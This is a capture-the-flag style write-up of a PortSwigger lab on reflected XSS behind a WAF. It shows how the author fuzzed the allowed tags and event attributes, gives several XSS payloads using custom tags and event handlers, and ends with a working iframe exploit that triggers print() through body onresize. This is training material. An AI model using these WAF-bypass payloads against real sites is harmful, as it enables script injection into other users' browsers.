
# Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

Note: Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.

---------------------------------------------

References: 

- https://portswigger.net/web-security/cross-site-scripting/exploiting

- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

---------------------------------------------

The content of the search is reflected inside a h1 HTML element:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)



If we try to add a tag "h1" it gets blocked:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/2.png)


But not if it is "h2":



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/3.png)


With this payload the HTML is generated correctly:

```
<h3>a</h3>
```



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/4.png)


With this payload it says “Attribute is not allowed”:

```
<h3 onerror=alert(1)>a</h3>
```



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/5.png)


I sent it to Intruder and got all events from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet:  



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/6.png)


The only ones working:
- onbeforeinput
- onratechange
- onscrollend
- onresize



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/7.png)


I will do the same for the tags, in this case using Battery Ram attack type:



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/8.png)


The only ones working:
- custom tags
- body



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/9.png)



The information in the cheatsheet from these attributes is:


![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/10.png)
![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/11.png)
![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/12.png)
![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/13.png)



So we have 3 possible payloads, because as "audio" and “video” tags are not available we can not use "onratechange":

```
<xss contenteditable onbeforeinput=alert(1)>test
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
<body onresize="print()">
```


Regarding the "onscrollend" payload, I updated it because it can not use “br” or “span”. However, it is necessary to scroll to the top or the bottom to see the alert pop:

```
<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>
```



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/14.png)


Regarding the “onbeforeinput” payload, it is necessary to click the text and update it for the alert to pop:

```
<xss contenteditable onbeforeinput=alert(1)>test</xss>
```



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/15.png)



The third one is valid but it needs the user to change the size of the tab:

```
<body onresize="print()">
```



![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/16.png)



We will send this last one inside an iframe:

```
https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E
```

```
<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
```
